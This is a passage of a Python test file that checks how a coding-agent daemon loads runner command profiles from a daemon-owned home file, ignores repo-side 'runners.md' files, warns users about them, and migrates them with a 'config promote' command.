        f"legacy repo-side profile reached the exec site: {result.command!r}"
    )


def test_home_owned_runners_md_resolves_and_is_used(tmp_path, cold_profiles):
    """The daemon-owned ``<home>/runners.md`` is the custom-profile home."""
    repo, home = _repo_and_home(tmp_path)
    (home / conf.PROFILES_FILENAME).write_text(
        "---\nhome-runner:\n  cmd: 'home-runner --go'\n---\n", encoding="utf-8"
    )

    assert _build_cmd("home-runner", "fix it", {}, repo) == ["home-runner", "--go"]


def test_bundled_profiles_still_resolve_with_no_home_file(tmp_path, cold_profiles):
    repo, _home = _repo_and_home(tmp_path)
    assert _build_cmd("codex", "fix it", {}, repo)[0] == "codex"


def test_security_config_runner_cmd_still_wins_over_a_home_profile(
    tmp_path, cold_profiles,
):
    """``runner_cmd`` is the operator's pin and outranks any profile ``cmd``."""
    repo, home = _repo_and_home(tmp_path)
    conf.write_config(repo, {"home.path": str(home)})
    (home / conf.SECURITY_CONFIG_FILENAME).write_text(
        "runner_cmd=pinned-runner --go\n", encoding="utf-8"
    )
    (home / conf.PROFILES_FILENAME).write_text(
        "---\ncodex:\n  cmd: 'from-home-profile'\n---\n", encoding="utf-8"
    )

    cfg = conf.load_config(repo)
    assert _build_cmd("codex", "fix it", cfg, repo) == ["pinned-runner", "--go"]


def test_wake_runner_catalog_renders_home_profiles_and_not_repo_ones(
    tmp_path, monkeypatch, cold_profiles,
):
    """Selection is not the only reader — the catalog the wake is shown
    must move to the new source too, or the visible half stays poisoned."""
    repo, home = _repo_and_home(tmp_path)
    (home / conf.PROFILES_FILENAME).write_text(
        "---\nhome-shell:\n  cmd: 'home-shell run'\n---\n", encoding="utf-8"
    )
    (repo / ".brr" / "runners.md").write_text(
        "---\nrepo-shell:\n  cmd: 'repo-shell run'\n---\n", encoding="utf-8"
    )
    # No Shell binary resolves — keeps the catalog probe IO-free. Rows for
    # unavailable profiles are still emitted, which is what this asserts on.
    monkeypatch.setattr(runner_mod.shutil, "which", lambda _name: None)

    names = {row["name"] for row in runner_mod.available_runner_catalog(repo)}

    assert "home-shell" in names, f"home profile missing from the catalog: {names}"
    assert "repo-shell" not in names, f"repo profile rendered in the catalog: {names}"


def test_profiles_cache_key_can_never_name_a_repo_path(tmp_path, cold_profiles):
    """The cache key is part of the fix.

    Keyed on a resolved repo path, a poisoned repo file gets its own cache
    entry and is served for the rest of the process. After this change the
    key can only be the daemon-owned home or the bundle, so there is no
    key shape a repo tree can mint.
    """
    repo, _home = _repo_and_home(tmp_path)
    (repo / ".brr" / "runners.md").write_text(
        "---\nrepo-shell:\n  cmd: 'repo-shell run'\n---\n", encoding="utf-8"
    )
    legacy = repo / ".brr" / "prompts" / "runners.md"
    legacy.parent.mkdir(parents=True, exist_ok=True)
    legacy.write_text(
        "---\nlegacy-shell:\n  cmd: 'legacy-shell run'\n---\n", encoding="utf-8"
    )

    key, _text = runner_mod._profiles_source(repo)

    assert str(repo) not in key, f"cache key names a repo path: {key!r}"


def test_ignored_repo_side_profile_file_surfaces_as_a_run_notice_and_warning(
    tmp_path, monkeypatch, capsys,
):
    """A silent ignore is not acceptable: a user with a working custom
    profile must be told, not surprised. Same notice channel as #533."""
    write_repo_scaffold(tmp_path)
    (tmp_path / ".brr" / "runners.md").write_text(
        "---\nlocal-agent:\n  cmd: 'local-agent run'\n---\n", encoding="utf-8"
    )
    event = make_event(tmp_path, eid="evt-693-notice")
    _stub_worktree_env(monkeypatch, tmp_path)

    monkeypatch.setattr(
        daemon.runner, "resolve_runner_profile",
        lambda _root, _overrides=None: daemon.runner.runner_profile("codex", _root),
    )
    monkeypatch.setattr(daemon.gitops, "current_branch", lambda _root: "main")
    monkeypatch.setattr(
        daemon.prompts, "build_daemon_prompt",
        lambda task, eid, rp, root, **kw: "PROMPT",
    )

    daemon._run_worker(event, tmp_path, tmp_path / ".brr" / "responses", {}, 0)

    notices = daemon._read_outbox_notices(
        tmp_path / ".brr" / "outbox" / "evt-693-notice"
    )
    assert any(".brr/runners.md" in n["text"] for n in notices), notices
    assert any("brnrd config promote" in n["text"] for n in notices), notices

    captured = capsys.readouterr()
    assert "WARNING" in captured.out
    assert ".brr/runners.md" in captured.out


def test_no_profile_notice_when_the_repo_has_no_runners_file(tmp_path, monkeypatch):
    write_repo_scaffold(tmp_path)
    event = make_event(tmp_path, eid="evt-693-clean")
    _stub_worktree_env(monkeypatch, tmp_path)

    monkeypatch.setattr(
        daemon.runner, "resolve_runner_profile",
        lambda _root, _overrides=None: daemon.runner.runner_profile("codex", _root),
    )
    monkeypatch.setattr(daemon.gitops, "current_branch", lambda _root: "main")
    monkeypatch.setattr(
        daemon.prompts, "build_daemon_prompt",
        lambda task, eid, rp, root, **kw: "PROMPT",
    )

    daemon._run_worker(event, tmp_path, tmp_path / ".brr" / "responses", {}, 0)

    notices = daemon._read_outbox_notices(
        tmp_path / ".brr" / "outbox" / "evt-693-clean"
    )
    assert not any("runners.md" in n["text"] for n in notices), notices


# ── ``brnrd config promote`` picks the profile file up ──────────────────


def test_plan_promote_carries_the_repo_side_profiles_file(tmp_path):
    repo, home = _repo_and_home(tmp_path)
    (repo / ".brr" / "runners.md").write_text(
        "---\nlocal-agent:\n  cmd: 'local-agent run'\n---\n", encoding="utf-8"
    )

    plan = conf.plan_promote(repo)

    assert plan.profiles_move == (
        repo / ".brr" / "runners.md",
        home / conf.PROFILES_FILENAME,
    )
    assert plan.profiles_conflict is False


def test_apply_promote_moves_the_profiles_file_and_the_profile_is_then_used(
    tmp_path, cold_profiles,
):
    """One command migrates an existing custom-profile user.

    Asserts the *effect* — the promoted profile is the one the command
    builder resolves afterwards — not just that a file moved.
    """
    repo, home = _repo_and_home(tmp_path)
    (repo / ".brr" / "runners.md").write_text(
        "---\nlocal-agent:\n  cmd: 'local-agent run --yes'\n---\n", encoding="utf-8"
    )

    conf.apply_promote(repo, conf.plan_promote(repo))

    assert not (repo / ".brr" / "runners.md").exists()
    assert (home / conf.PROFILES_FILENAME).exists()
    assert _build_cmd("local-agent", "fix it", {}, repo) == [
        "local-agent", "run", "--yes",
    ]


def test_apply_promote_refuses_to_clobber_an_existing_home_profiles_file(tmp_path):
    repo, home = _repo_and_home(tmp_path)
    (repo / ".brr" / "runners.md").write_text(
        "---\nrepo-agent:\n  cmd: 'repo-agent'\n---\n", encoding="utf-8"
    )
    (home / conf.PROFILES_FILENAME).write_text(
        "---\nhome-agent:\n  cmd: 'home-agent'\n---\n", encoding="utf-8"
    )

    plan = conf.plan_promote(repo)
    assert plan.profiles_conflict is True

    with pytest.raises(conf.ConfigPromoteError):
        conf.apply_promote(repo, plan, force=False)

    assert "home-agent" in (home / conf.PROFILES_FILENAME).read_text(encoding="utf-8")
    assert (repo / ".brr" / "runners.md").exists()


def test_apply_promote_is_idempotent_for_the_profiles_file(tmp_path):
    repo, home = _repo_and_home(tmp_path)
    (repo / ".brr" / "runners.md").write_text(
        "---\nlocal-agent:\n  cmd: 'local-agent run'\n---\n", encoding="utf-8"
    )

    conf.apply_promote(repo, conf.plan_promote(repo))
    second = conf.plan_promote(repo)
    assert second.profiles_move is None
    conf.apply_promote(repo, second)  # no-op, must not raise

    assert "local-agent" in (home / conf.PROFILES_FILENAME).read_text(encoding="utf-8")


def test_cli_config_promote_reports_and_moves_the_profiles_file(
    monkeypatch, tmp_path, capsys,
):
    repo = tmp_path / "repo"
    init_git_repo(repo)
    monkeypatch.chdir(repo)
    home = tmp_path / "home"
    home.mkdir()
    conf.write_config(repo, {"home.path": str(home)})
    (repo / ".brr" / "runners.md").write_text(
        "---\nlocal-agent:\n  cmd: 'local-agent run'\n---\n", encoding="utf-8"
    )

    rc = main(["config", "promote"])

    assert rc == 0
    out = capsys.readouterr().out
    assert "runners.md" in out
    assert (home / conf.PROFILES_FILENAME).exists()
    assert not (repo / ".brr" / "runners.md").exists()


def test_cli_config_promote_dry_run_leaves_the_profiles_file_alone(
    monkeypatch, tmp_path, capsys,
):
    repo = tmp_path / "repo"
    init_git_repo(repo)
    monkeypatch.chdir(repo)
    home = tmp_path / "home"
    home.mkdir()
    conf.write_config(repo, {"home.path": str(home)})
    (repo / ".brr" / "runners.md").write_text(
        "---\nlocal-agent:\n  cmd: 'local-agent run'\n---\n", encoding="utf-8"
    )

    rc = main(["config", "promote", "--dry-run"])

    assert rc == 0
    assert "runners.md" in capsys.readouterr().out
    assert (repo / ".brr" / "runners.md").exists()
    assert not (home / conf.PROFILES_FILENAME).exists()
